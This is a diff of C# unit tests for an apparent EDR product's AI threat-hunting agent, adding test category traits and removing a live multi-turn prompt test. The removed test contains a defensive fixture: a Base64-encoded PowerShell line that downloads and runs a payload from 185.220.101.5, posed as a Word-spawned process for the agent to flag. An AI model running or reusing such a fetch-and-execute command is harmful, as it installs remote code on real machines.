@@ -23,6 +23,7 @@ public class AutonomousHunterAgentTests
     }
 
     [Fact]
+    [Trait("Category", "Unit")]
     public async Task TestAutonomousInvestigationOnSuspendedProcess()
     {
         // 1. 컴포넌트 셋업 (명시적 null 주입으로 환경변수 영향 없는 오프라인 모드 격리)
@@ -118,6 +119,7 @@ public class AutonomousHunterAgentTests
     }
 
     [Fact]
+    [Trait("Category", "Unit")]
     public async Task TestGeminiLiveModeWithMockHttp()
     {
         // 1. 모의 Gemini REST 멀티턴 2단계 응답 구성
@@ -276,6 +278,7 @@ public class AutonomousHunterAgentTests
     }
 
     [Fact]
+    [Trait("Category", "Unit")]
     public async Task TestGeminiFallbackToOfflineOnNetworkFailure()
     {
         // 네트워크 단절 시 예외를 던지는 모의 핸들러
@@ -329,6 +332,7 @@ public class AutonomousHunterAgentTests
     }
 
     [Fact]
+    [Trait("Category", "Live")]
     public async Task TestLiveGoogleVertexAiFromMvConfig()
     {
         var client = await GeminiRestClient.TryCreateFromMundusVivensConfigAsync(modelName: "gemini-3.8-flash");
@@ -348,6 +352,7 @@ public class AutonomousHunterAgentTests
     }
 
     [Fact]
+    [Trait("Category", "Live")]
     public async Task TestLiveAutonomousInvestigationWithMvCredentials()
     {
         var treeManager = new ProcessTreeProjectionManager();
@@ -421,191 +426,6 @@ public class AutonomousHunterAgentTests
         }
     }
 
-    [Fact]
-    public async Task TestPrintLiveMultiTurnPromptsAndResponses()
-    {
-        var client = await GeminiRestClient.TryCreateFromMundusVivensConfigAsync(modelName: "gemini-3.8-flash");
-        Assert.NotNull(client);
-
-        string systemInstruction = """
-            <system_directive>
-            당신은 최첨단 엔터프라이즈 EDR 'Phalanx'의 자율 AI 위협 헌터(Autonomous Hunter Agent)입니다.
-            24μs 선제 동결된 의심 프로세스를 수사하여 최종 판결(ACTION_KILL / ACTION_RESUME)과 공식 침해사고 서사를 도출하십시오.
-            </system_directive>
-
-            <tools>
-            1. DecodePayloadTool: Base64/Hex 난독화 명령줄 해독 (encodedCommand: string)
-            2. ProcessMemoryScanTool: 동결 프로세스 RAM 메모리 내 C2/URL 스캔 (targetPid: number)
-            3. ThreatReputationTool: 통신 지표(IP/도메인) 위협 평판 조회 (targetIndicator: string)
-            4. MitreClassifierTool: 관찰된 공격 행위 MITRE TTP 분류 (observedBehavior: string)
-            5. SystemFirewallTool: 악성 C2 IP 방화벽 차단 (maliciousIp: string)
-            </tools>
-
-            <rules>
-            1. 증거 불충분 시: is_final_verdict: false로 지정하고 최적의 수사 도구를 호출하십시오.
-            2. 관찰 피드백: <tool_observation> 결과를 분석하여 다음 도구로 연계하거나 최종 판결로 전환하십시오.
-            3. 최종 판결 시: is_final_verdict: true, action_tool: "None"으로 지정하고 모든 판결 필드를 완성하십시오.
-            4. 공식 서사: narrative는 한국어 보고서 문체로 발단, 동결, 수사 결과, 처분 사유를 구체적으로 서술하십시오.
-            </rules>
-
-            <output_format>
-            interface AiInvestigationDecision {
-              thought: string;
-              action_tool: string;
-              action_args: Record<string, any>;
-              is_final_verdict: boolean;
-              verdict_action?: "ACTION_KILL" | "ACTION_RESUME";
-              confidence_score: number;
-              summary_title?: string;
-              narrative?: string;
-              mitre_tactics?: string[];
-            }
-            </output_format>
-
-            <example type="investigation">
-            {
-              "thought": "부모 winword.exe가 기동한 powershell.exe에 Base64 난독화가 확인되어 해독 도구를 호출합니다.",
-              "action_tool": "DecodePayloadTool",
-              "action_args": { "encodedCommand": "SQBuAHY..." },
-              "is_final_verdict": false
-            }
-            </example>
-            <example type="verdict">
-            {
-              "thought": "해독된 스크립트에서 추출된 IP(185.220.101.5)의 위협 평판이 98점으로 확인되어 악성 C2 통신으로 확증합니다.",
-              "action_tool": "None",
-              "action_args": {},
-              "is_final_verdict": true,
-              "verdict_action": "ACTION_KILL",
-              "confidence_score": 0.99,
-              "summary_title": "악성 오피스 매크로를 통한 C2 다운로더 침투 탐지",
-              "narrative": "winword.exe가 기동한 의심 파워셸을 24μs 만에 선제 동결하였으며, Base64 해독 및 위협 평판 조회 결과 해외 악성 C2와의 통신 시도가 확증되어 즉각 사살(ACTION_KILL)을 집행했습니다.",
-              "mitre_tactics": ["T1566.001", "T1059.001", "T1071.001"]
-            }
-            </example>
-            """;
-
-        string rawScript = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://185.220.101.5/payload.ps1')";
-        string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(rawScript));
-        string fullCmd = $"powershell.exe -enc {b64}";
-
-        string userPromptTurn1 = $"""
-            <target_context>
-            - ProcessId: 8492
-            - ImageName: powershell.exe
-            - CommandLine: {fullCmd}
-            - ParentProcess: winword.exe (PID: 3104)
-            - AncestryChain: powershell.exe(PID:8492) -> winword.exe(PID:3104)
-            - Status: SUSPENDED (24μs 원자적 동결 완료, 메모리 보존 상태)
-            </target_context>
-
-            <final_instruction>
-            위 <target_context>의 정보를 정밀 분석하여, 첫 번째로 실행할 OS 조사 도구를 <output_format> 규격의 순수 JSON으로 제출하십시오. (증거 수집 단계이므로 is_final_verdict: false를 지정하십시오)
-            </final_instruction>
-            """;
-
-        var conversation = new List<Content>
-        {
-            new Content("user", new List<Part> { new Part(userPromptTurn1) })
-        };
-
-        _output.WriteLine("================================================================================");
-        _output.WriteLine(">>> [TURN 1: LLM 입력 프롬프트 (User Prompt)] <<<");
-        _output.WriteLine("================================================================================");
-        _output.WriteLine(userPromptTurn1);
-
-        // Turn 1 추론 호출
-        string turn1Response = await client.GenerateContentAsync(conversation, systemInstruction);
-        _output.WriteLine("\n================================================================================");
-        _output.WriteLine("<<< [TURN 1: LLM 출력 응답 (Model Response)] <<<");
-        _output.WriteLine("================================================================================");
-        _output.WriteLine(turn1Response);
-
-        conversation.Add(new Content("model", new List<Part> { new Part(turn1Response) }));
-
-        // C# 도구(DecodePayloadTool) 실제 실행
-        var decodeTool = new DecodePayloadTool();
-        var toolResult = await decodeTool.ExecuteAsync(new() { ["encodedCommand"] = fullCmd });
-
-        _output.WriteLine("\n================================================================================");
-        _output.WriteLine("⚙️ [C# 도구 실제 실행 결과 (Tool Observation)] ⚙️");
-        _output.WriteLine("================================================================================");
-        _output.WriteLine(toolResult.Output);
-
-        string userPromptTurn2 = $"""
-            <tool_observation tool="DecodePayloadTool">
-            {toolResult.Output}
-            </tool_observation>
-
-            <final_instruction>
-            위 <tool_observation>의 실행 결과를 면밀히 검토하여, 추가 조사가 필요하면 다음 도구를 호출하고, 위협 여부가 충분히 입증되었다면 is_final_verdict: true와 함께 최종 판결(ACTION_KILL 또는 ACTION_RESUME)을 제출하십시오.
-            </final_instruction>
-            """;
-
-        conversation.Add(new Content("user", new List<Part> { new Part(userPromptTurn2) }));
-
-        _output.WriteLine("\n================================================================================");
-        _output.WriteLine(">>> [TURN 2: LLM 입력 피드백 (Observation Feedback Prompt)] <<<");
-        _output.WriteLine("================================================================================");
-        _output.WriteLine(userPromptTurn2);
-
-        // Turn 2 추론 호출
-        string turn2Response = await client.GenerateContentAsync(conversation, systemInstruction);
-        _output.WriteLine("\n================================================================================");
-        _output.WriteLine("<<< [TURN 2: LLM 최종 출력 응답 (Final Verdict Model Response)] <<<");
-        _output.WriteLine("================================================================================");
-        _output.WriteLine(turn2Response);
-
-        var turn2Decision = LlmJsonParser.DeserializeSafe<AiInvestigationDecision>(turn2Response);
-        Assert.NotNull(turn2Decision);
-
-        if (!turn2Decision.IsFinalVerdict && turn2Decision.ActionTool == "ThreatReputationTool")
-        {
-            conversation.Add(new Content("model", new List<Part> { new Part(turn2Response) }));
-
-            var repTool = new ThreatReputationTool();
-            var repResult = await repTool.ExecuteAsync(new() { ["targetIndicator"] = "185.220.101.5" });
-
-            _output.WriteLine("\n================================================================================");
-            _output.WriteLine("⚙️ [C# 2차 도구 실제 실행 결과 (Tool Observation: ThreatReputationTool)] ⚙️");
-            _output.WriteLine("================================================================================");
-            _output.WriteLine(repResult.Output);
-
-            string userPromptTurn3 = $"""
-                <tool_observation tool="ThreatReputationTool">
-                {repResult.Output}
-                </tool_observation>
-
-                <final_instruction>
-                위 <tool_observation>의 실행 결과를 면밀히 검토하여 최종 판결(is_final_verdict: true) 및 사형/정상 복구 결정을 제출하십시오.
-                </final_instruction>
-                """;
-
-            conversation.Add(new Content("user", new List<Part> { new Part(userPromptTurn3) }));
-
-            _output.WriteLine("\n================================================================================");
-            _output.WriteLine(">>> [TURN 3: LLM 입력 피드백 (Observation Feedback Prompt)] <<<");
-            _output.WriteLine("================================================================================");
-            _output.WriteLine(userPromptTurn3);
-
-            string turn3Response = await client.GenerateContentAsync(conversation, systemInstruction);
-            _output.WriteLine("\n================================================================================");
-            _output.WriteLine("<<< [TURN 3: LLM 최종 출력 응답 (Final Verdict Model Response)] <<<");
-            _output.WriteLine("================================================================================");
-            _output.WriteLine(turn3Response);
-
-            var finalDecision = LlmJsonParser.DeserializeSafe<AiInvestigationDecision>(turn3Response);
-            Assert.NotNull(finalDecision);
-            Assert.True(finalDecision.IsFinalVerdict);
-            Assert.Equal("ACTION_KILL", finalDecision.VerdictAction);
-        }
-        else
-        {
-            Assert.True(turn2Decision.IsFinalVerdict);
-            Assert.Equal("ACTION_KILL", turn2Decision.VerdictAction);
-        }
-    }
-
     private class MockHttpMessageHandler : HttpMessageHandler
     {
         private readonly Func<HttpRequestMessage, HttpResponseMessage> _handler;
@@ -622,6 +442,7 @@ public class AutonomousHunterAgentTests
     }
 
     [Fact]
+    [Trait("Category", "Unit")]
     public void TestLlmJsonParserWithNestedBracesInStringAndMarkdown()
     {
         // LLM이 마크다운 백틱, 앞뒤 잡담, 문자열 내부 중괄호 및 이스케이프를 출력한 극단적 엣지 케이스
